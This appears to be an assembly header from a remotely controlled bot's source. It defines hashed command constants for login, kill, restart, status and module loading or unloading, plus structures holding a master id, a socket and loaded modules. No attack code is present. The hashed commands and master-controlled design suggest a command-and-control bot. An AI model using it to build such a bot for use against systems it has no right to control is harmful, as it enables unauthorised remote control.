;-----------------------------------------------------------------------
get_token           proto :dword, :dword, :byte, :dword, :byte

;-----------------------------------------------------------------------
DOT_LOGIN_COMMAND   equ 0E04EF9E8h
DOT_DIE_COMMAND     equ 0A79021D4h
DOT_RESTART_COMMAND equ 0F34B5274h
DOT_STATUS_COMMAND  equ 0C82C5900h
DOT_MODULES_COMMAND equ 03A0533A4h
DOT_UNLOADM_COMMAND equ 0417051E3h
DOT_RELOADM_COMMAND equ 0EE109FAEh
SWITCH_VERBOSE_MODE equ 0D8959C19h

;-----------------------------------------------------------------------
smodules    struct
    handle  dd  ?
    lpmdt   dd  ?
smodules    ends

;-----------------------------------------------------------------------
sbot_data    struct
    szusername          byte 64 dup(?)
    dwmaster            dword   ?
    dwsocket            dword   ?
    modules             smodules    MAX_MODULES dup(<>)
    WSAData             WSADATA     <>
    sSystemTime         SYSTEMTIME  <>
sbot_data    ends

;-----------------------------------------------------------------------
